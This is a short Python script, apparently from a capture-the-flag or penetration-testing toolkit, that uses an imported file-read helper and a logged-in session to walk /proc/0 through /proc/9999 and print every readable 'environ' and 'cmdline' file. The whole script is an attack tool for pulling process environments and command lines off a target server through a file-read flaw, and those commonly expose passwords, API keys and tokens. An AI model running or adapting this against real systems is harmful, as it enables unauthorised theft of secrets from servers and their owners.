#!/usr/bin/env python3
from readFile import getLoggedInSession, readFile

def enumProcs(session, file, procRange):
    for procNum in range(procRange):
        path = f"proc/{procNum}/{file}"
        content = readFile(session, path)
        if len(content.strip()) > 0 and content not in ["File not found", "Permission denied"]:
            print(f"\n{file} of {procNum}:\n{content}\n")

        print(f"Trying /proc/{procNum}/{file}", end='\r', flush=True)

def main():
    procRange = 10000
    files = ["environ", "cmdline"]
    session = getLoggedInSession()

    for file in files:
        enumProcs(session, file, procRange)

if __name__ == "__main__":
    main()
